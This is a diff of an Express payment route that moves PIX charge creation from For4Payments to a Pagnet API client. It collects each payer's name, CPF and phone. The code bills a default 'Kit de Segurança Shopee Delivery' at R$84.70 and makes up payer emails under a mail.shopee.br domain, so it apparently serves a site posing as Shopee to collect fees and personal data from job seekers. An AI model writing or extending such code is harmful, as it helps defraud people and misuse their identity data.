@@ -742,22 +742,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
-  // Rota proxy para For4Payments para evitar CORS
+  // Rota proxy para Pagnet API para evitar CORS
   app.post('/api/proxy/for4payments/pix', async (req, res) => {
     try {
-      // Verificar se a API For4Payments está configurada
-      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
-        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
+      // Verificar se a API Pagnet está configurada
+      if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
+        console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas');
         return res.status(500).json({
-          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
+          error: 'Serviço de pagamento não configurado. Configure as chaves de API Pagnet.',
         });
       }
       
-      console.log('Iniciando proxy para For4Payments...');
-      
-      // Configurar cabeçalhos para a requisição à For4Payments
-      const apiUrl = 'https://app.for4payments.com.br/api/v1/transaction.purchase';
-      const secretKey = process.env.FOR4PAYMENTS_SECRET_KEY;
+      console.log('Iniciando proxy para Pagnet...');
       
       // Processar os dados recebidos
       const { name, cpf, email, phone, amount = 84.70, description = "Kit de Segurança Shopee Delivery" } = req.body;
@@ -766,57 +762,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
       }
       
-      // Processar CPF - remover caracteres não numéricos
-      const cleanedCpf = cpf.replace(/[^0-9]/g, '');
-      
-      // Processar telefone - remover caracteres não numéricos 
-      const cleanedPhone = phone ? phone.replace(/\D/g, '') : null;
-      
-      // Converter valor para centavos
-      const amountInCents = Math.round(amount * 100);
-      
       // Gerar email se não tiver sido fornecido
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
       
-      // Construir payload para a For4Payments conforme formato esperado
-      const payload = {
-        name,
-        email: userEmail,
-        cpf: cleanedCpf,
-        phone: cleanedPhone, // Telefone limpo, apenas números
-        paymentMethod: "PIX",
-        amount: amountInCents,
-        items: [{
-          title: description || "Kit de Segurança",
-          quantity: 1,
-          unitPrice: amountInCents,
-          tangible: false
-        }]
-      };
-      
-      console.log('Enviando requisição para For4Payments API via proxy...', {
-        name: payload.name,
-        cpf: `${cleanedCpf.substring(0, 3)}***${cleanedCpf.substring(cleanedCpf.length - 2)}`
+      console.log('Enviando requisição para Pagnet API via proxy...', {
+        name: name,
+        cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`
       });
       
-      // Enviar requisição para For4Payments
-      const response = await fetch(apiUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': secretKey, // A API espera apenas o token sem o prefixo 'Bearer'
-          'Accept': 'application/json'
+      // Importar e usar a API Pagnet
+      const { createPagnetAPI } = await import('./pagnet-api');
+      const pagnetAPI = createPagnetAPI();
+      
+      // Criar transação PIX usando Pagnet
+      const result = await pagnetAPI.createPixTransaction(
+        {
+          nome: name,
+          cpf: cpf,
+          email: userEmail,
+          phone: phone
         },
-        body: JSON.stringify(payload)
-      });
+        amount,
+        phone
+      );
       
-      // Processar resposta
-      const result = await response.json();
-      
-      console.log('Resposta da For4Payments recebida pelo proxy');
+      console.log('Resposta da Pagnet recebida pelo proxy');
       
       // Se a resposta foi bem-sucedida e temos os dados do PIX, enviar email
-      if (response.status === 200 && result && result.pixCode && result.pixQrCode) {
+      if (result.success && result.pix_code) {
         // Importar o serviço de email
         const { emailService } = await import('./email-service');
         
@@ -829,15 +802,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
         // Construir o link para a página de pagamento (se houver)
         // O frontend pode ter uma página específica para acompanhamento do pagamento
         const clientHost = getClientHost(req);
-        const paymentLink = `${clientHost}/payment?id=${result.id}&email=${encodeURIComponent(userEmail)}`;
+        const paymentLink = `${clientHost}/payment?id=${result.transaction_id}&email=${encodeURIComponent(userEmail)}`;
+        
+        // Gerar QR Code usando Google Charts API (similar ao formato For4Payments)
+        const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(result.pix_code)}`;
         
         // Enviar o email de confirmação
         try {
           const emailSent = await emailService.sendPaymentConfirmationEmail({
             email: userEmail,
             name,
-            pixCode: result.pixCode,
-            pixQrCode: result.pixQrCode,
+            pixCode: result.pix_code,
+            pixQrCode: pixQrCode,
             amount,
             formattedAmount,
             paymentLink
@@ -858,12 +834,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       }
       
-      // Retornar resposta para o cliente
-      return res.status(response.status).json(result);
+      // Retornar resposta para o cliente no formato compatível com For4Payments
+      if (result.success && result.pix_code) {
+        const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(result.pix_code)}`;
+        
+        const compatibleResponse = {
+          id: result.transaction_id,
+          pixCode: result.pix_code,
+          pixQrCode: pixQrCode,
+          status: 'pending',
+          emailSent: result.emailSent || false
+        };
+        
+        return res.status(200).json(compatibleResponse);
+      } else {
+        // Retornar erro da Pagnet
+        return res.status(400).json({
+          error: result.error || 'Erro desconhecido na criação do pagamento'
+        });
+      }
     } catch (error: any) {
-      console.error('Erro no proxy For4Payments:', error);
+      console.error('Erro no proxy Pagnet:', error);
       return res.status(500).json({ 
-        error: error.message || 'Falha ao processar pagamento pelo proxy'
+        error: error.message || 'Falha ao processar pagamento pelo proxy Pagnet'
       });
     }
   });
